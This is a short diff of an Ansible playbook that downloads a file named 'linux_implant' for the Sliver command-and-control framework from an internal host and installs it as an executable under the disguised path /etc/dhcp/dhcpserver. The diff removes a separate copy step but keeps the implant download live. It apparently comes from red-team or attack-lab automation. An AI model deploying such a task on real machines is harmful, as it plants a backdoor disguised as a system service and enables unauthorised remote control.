@@ -2,12 +2,6 @@
 - name: download sliver
   get_url:
     url: http://172.16.0.9:8000/linux_implant
-    dest: /tmp/dhcpserver
-    mode: 0755
-
-- name: make it a service 
-  copy:
-    src: /tmp/dhcpserver
     dest: /etc/dhcp/dhcpserver
     mode: 0755
 
